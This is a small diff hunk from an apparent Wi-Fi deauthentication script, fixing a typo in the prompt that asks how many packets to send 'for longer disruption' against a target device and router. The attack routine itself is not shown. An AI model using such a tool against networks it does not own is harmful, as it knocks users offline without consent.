@@ -20,7 +20,7 @@ def main():
     # Enter the MAC address of the Wi-Fi router/gateway
     gateway_mac = input("Enter the MAC address of the router: ")
     # Number of deauthentication packets to send
-    count = int(input("Enter the number of packets to send (higher for longer disruption - 100-1000ls): "))
+    count = int(input("Enter the number of packets to send (higher for longer disruption - 100-1000): "))
 
     deauth(target_mac, gateway_mac, count)
 
